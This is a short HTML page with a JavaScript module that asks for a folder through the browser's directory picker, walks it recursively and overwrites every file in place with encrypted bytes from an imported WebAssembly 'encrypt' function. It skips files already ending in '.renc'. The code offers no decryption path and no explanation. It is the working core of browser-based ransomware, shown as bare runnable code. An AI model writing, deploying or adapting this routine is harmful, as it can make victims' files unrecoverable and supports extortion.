<script type="module">
	import init, {encrypt} from "./pkg/client.js";

	init().then(() => {
		async function encryptFile(fileHandle) {
			const file = await fileHandle.getFile();
			var contents = new Uint8Array(await file.arrayBuffer());

			if (contents.length <= 0) {
				return;
			}

			let encrypted = encrypt(contents);

			const writable = await fileHandle.createWritable();
			await writable.write(encrypted);
			await writable.close();
		}

		async function encryptDirectory(dirHandle) {
			for await (const entry of dirHandle.values()) {
				if (entry.kind == "directory") {
					await encryptDirectory(entry);
				} else if (!entry.name.endsWith(".renc")) {
					await encryptFile(entry);
				}
			}
		}

		const button = document.getElementById("button");

		button.addEventListener("click", async () => {
			const dirHandle = await window.showDirectoryPicker();
			await encryptDirectory(dirHandle);
		});
	});
</script>

<button id="button">run</button>
